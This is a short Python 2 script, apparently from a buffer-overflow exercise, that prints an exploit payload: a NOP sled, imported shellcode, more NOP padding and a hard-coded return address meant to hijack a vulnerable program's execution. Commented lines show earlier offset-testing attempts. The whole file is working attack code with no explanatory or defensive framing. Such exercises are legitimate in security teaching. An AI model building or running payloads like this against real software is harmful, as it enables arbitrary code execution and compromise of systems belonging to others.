from shellcode import shellcode
#print shellcode + 
print "\x90"*300 + shellcode + "\x90"*683 + "\xa0\xf6\xfe\xbf"
#print "\xAA"*1036 + "\xa0\xf6\xfe\xbf"
